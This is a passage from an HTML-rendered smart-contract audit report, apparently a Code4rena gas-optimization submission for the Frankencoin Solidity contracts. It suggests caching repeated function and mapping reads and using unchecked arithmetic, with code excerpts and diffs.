3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Frankencoin.sol.suggestMinter(): Result of totalSupply() should be cached here(sad path)</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">suggestMinter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_message</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">84</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">MIN_APPLICATION_PERIOD</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PeriodTooShort</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">MIN_FEE</span><span class=\"mtk1\">  &amp;&amp; </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FeeTooLow</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyRegistered</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MinterApplied</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_message</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Frankencoin.sol b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e9e87dc..556d882 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -81,8 +81,9 @@ contract Frankencoin is ERC20PermitLight, IFrankencoin {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     * minter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function suggestMinter(address _minter, uint256 _applicationPeriod, uint256 _applicationFee, string calldata _message) override external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (_applicationPeriod &lt; MIN_APPLICATION_PERIOD &amp;&amp; totalSupply() &gt; 0) revert PeriodTooShort();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (_applicationFee &lt; MIN_FEE  &amp;&amp; totalSupply() &gt; 0) revert FeeTooLow();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      uint256 _totalSupply = totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      if (_applicationPeriod &lt; MIN_APPLICATION_PERIOD &amp;&amp; _totalSupply &gt; 0) revert PeriodTooShort();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      if (_applicationFee &lt; MIN_FEE  &amp;&amp; _totalSupply &gt; 0) revert FeeTooLow();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       if (minters[_minter] != 0) revert AlreadyRegistered();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _transfer(msg.sender, address(reserve), _applicationFee);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       minters[_minter] = block.timestamp + _applicationPeriod;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L204-L213\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L204-L213</a></p>\n<h3 id=\"frankencoinsolcalculateassignedreserve-results-of-minterreserve-should-be-cached\" style=\"position:relative;\"><a href=\"#frankencoinsolcalculateassignedreserve-results-of-minterreserve-should-be-cached\" aria-label=\"frankencoinsolcalculateassignedreserve results of minterreserve should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Frankencoin.sol.calculateAssignedReserve(): Results of minterReserve() should be cached</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateAssignedReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reservePPM</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_reservePPM</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">minterReserve</span><span class=\"mtk1\">()){ </span><span class=\"mtk3\">//@audit: Initial call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// not enough reserves, owner has to take a loss</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">minterReserve</span><span class=\"mtk1\">();</span><span class=\"mtk3\">//@audit: second call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:      } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Frankencoin.sol b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e9e87dc..1f0a60e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -204,9 +204,10 @@ contract Frankencoin is ERC20PermitLight, IFrankencoin {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function calculateAssignedReserve(uint256 mintedAmount, uint32 _reservePPM) public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 theoreticalReserve = _reservePPM * mintedAmount / 1000000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 currentReserve = balanceOf(address(reserve));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (currentReserve &lt; minterReserve()){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      uint256 _minterReserve = minterReserve();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      if (currentReserve &lt; _minterReserve){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          // not enough reserves, owner has to take a loss</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         return theoreticalReserve * currentReserve / minterReserve();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         return theoreticalReserve * currentReserve / _minterReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          return theoreticalReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       }</span></span></span></code></pre>\n<h2 id=\"g-03-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#g-03-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"g 03 multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>Caching a mapping’s value in a local storage or calldata variable when the value is accessed multiple times saves ~42 gas per access due to not having to perform the same offset calculation every time.<br>\n<strong>Help the Optimizer by saving a storage variable’s reference instead of repeatedly fetching it</strong></p>\n<p>To help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array.</p>\n<p>As an example, instead of repeatedly calling <code>someMap[someIndex]</code>, save its reference like this: <code>SomeStruct storage someStruct = someMap[someIndex]</code> and use it.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L83-L90\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L83-L90</a></p>\n<h3 id=\"frankencoinsolsuggestminter-minters_minter-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#frankencoinsolsuggestminter-minters_minter-should-be-cached-in-local-storage\" aria-label=\"frankencoinsolsuggestminter minters_minter should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Frankencoin.sol.suggestMinter(): minters[_minter] should be cached in local storage</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">suggestMinter</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_message</span><span class=\"mtk1\">) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AlreadyRegistered</span><span class=\"mtk1\">();</span><span class=\"mtk3\">//@audit: 1st access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_applicationFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">minters</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_minter</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_applicationPeriod</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit: 2nd access</span></span></span></code></pre>\n<h2 id=\"g-04-using-unchecked-blocks-to-save-gas\" style=\"position:relative;\"><a href=\"#g-04-using-unchecked-blocks-to-save-gas\" aria-label=\"g 04 using unchecked blocks to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Using unchecked blocks to save gas</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block<br>\n<a href=\"https://github.com/ethereum/solidity/issues/10695\">see resource</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L247\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L247</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Equity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">247</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">equity</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> ? </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ONE_DEC18</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">calculateSharesInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">equity</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>equity - amount</code> cannot underflow as it would only be performed if <code>equity &#x3C;= amount</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L294\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L294</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Equity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTotalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The above operation cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L293\">Line 293</a> which checks that <code>shares + ONE_DEC18 &#x3C; totalShares</code>. This means that  whatever value <code>shares</code> would have, the operation would only be performed if it’s less than <code>totalShares</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L144\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L144</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minReserve</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>balance - minReserve</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L141\">Line 141</a> that ensures that <code>balance</code> is greater than <code>minReserve</code> before performing this operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L286\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L286</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">reserveLeft</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>_amount - reserveLeft</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L282\">Line 282</a> which ensures that our arithmetic operation would only be performed if <code>reserveLeft</code> is less than <code>_amount</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L138\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L138</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span 